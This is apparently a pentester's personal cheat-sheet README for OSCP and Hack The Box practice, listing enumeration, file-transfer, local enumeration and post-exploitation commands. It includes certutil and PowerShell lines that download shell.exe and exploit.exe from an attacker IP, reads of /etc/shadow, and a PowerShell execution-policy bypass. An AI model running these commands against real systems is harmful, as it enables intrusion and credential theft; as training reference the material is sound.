# Hacking-Cheatsheet
In this repo I collect all commands, links, techniques and tricks i found during my work as pentester, hacker, OSCP student and hack the box fan.

- [External Enumeration](#external-enumeration)
  - [OSINT](#osint)
  - [Port-Scanning](#port-scanning)
  - [SMB-Enumeration](#smb-enumeration)
  - [SMTP-Enumeration](#smtp-enumeration)
  - [SNMP-Enumeration](#snmp-enumeration)
- [File Transfer and File Downloads](#file-transfer-and-file-downloads)
  - [Windows](#windows)
  - [Python Webserver](#python-webserver)
- [Creating Exploits](#creating-exploits)
  - [Buffer Overflows](#buffer-overflows)
- [Local Enumeration](#local-enumeration)
  - [Local Linux Enumeration](#local-linux-enumeration)
  - [Local Windows Enumeration](#local-windows-enumeration)
- [Post Exploitation](#post-exploitation)
  - [Linux Post Exploitation](#linux-post-exploitation)
  - [Windows Post Exploitation](#windows-post-exploitation)


# External Enumeration

## OSINT
### Crawl words from website for passwordlist
```bash
cewl <domain> -m 6 -w words.txt
```

## Port-Scanning
Scan all ports with Service Detection
```bash
nmap -v -A -p- <Target-IP>
```

## SMB-Enumeration

### Enum4Linux
```bash
enum4linux -a <IP>
```

### rpcclient
```bash
rpcclient -U "" <Target IP>
```
enter empty password

Commands in rpcclient console:
- srvinfo: Identify OS Versions
- enumdomusers: List of Usernames on this server
- getdompwinfo: Displays SMB password policy

## SMTP-Enumeration
SMTP-Enumeration with netcat
```bash
for user in $(cat typical_usernames_SMTP_Enumeration.txt); do echo VRFY $user |nc -nv -w 1 <Target-IP> 25 2>/dev/null |grep ^"250";done
```

## SNMP-Enumeration

Enumerate set of IPs for different SNMP communities
```bash
onesixtyone -c community_names.txt -i ips.txt
```
examples for community names:
- public


Get list of running programms
```bash
snmpwalk -c public -v1 <Target-IP> 1.3.6.1.2.1.25.4.2.1.2
```

Get list of open ports
```bash
snmpwalk -c public -v1 <Target-IP> 1.3.6.1.2.1.6.13.1.3
```

Get list of installed software
```bash
snmpwalk -c public -v1 <Target-IP> 1.3.6.1.2.1.25.6.3.1.2
```


# File Transfer and File Downloads

## Windows
### Download Files with Certutil
```bash
certutil.exe -urlcache -f http://<ip>:<port>/<filename> <localfilename>
```
Example:
```bash
certutil.exe -urlcache -f http://10.10.14.37:8080/shell.exe reverse_shell.exe
```

### Downlaod Files with Powershell
```cmd
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://192.168.30.5/exploit.exe" >>wget.ps1
echo $file = "new-exploit.exe" >>wget.ps1
echo $webclient.DownloadFile($url, $file) >>wget.ps1
```

Execute File with: [Execute Powershell File, bypass all policies](#execute-powershell-file-bypass-all-policies)

## Python Webserver
Create webserver listening to port 8080 offering files from current working directory
```bash
python3 -m http.server 8080
```
# Creating Exploits

## Creating Exploits with msfvenom

## Buffer Overflows

### Create unique pattern
Create a unique pattern to identify correct position for buffer overflow
```bash
/usr/share/metasploit-framework/tools/pattern_create.rb <# bytes>
```

# Local Enumeration

## Local Linux Enumeration

### System information/version
Show information about kernel and linux system
```bash
uname -a
```

Show linux version
```bash
cat /etc/issue
```

### Find local users
```bash
cat /etc/passwd
```

### Password hashes
```bash
cat /etc/shadow
```

### Find world writable files
```bash
find / -perm -2 ! -type l -ls 2>/dev/null
```

## Local Windows Enumeration

### Open Ports local
```cmd
netstat -an
```

### Check permission of executable
```bash
icacls <filename>
```

# Post Exploitation
## Linux Post Exploitation
### Create tty console with python
```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```
```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

## Windows Post Exploitation
### Execute Powershell file, bypass all policies
```cmd
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File file.ps1
```

### RDP Connection from Linux Host to Windows target
```cmd
rdesktop -u <User> -p <Password> <Target-IP>
```
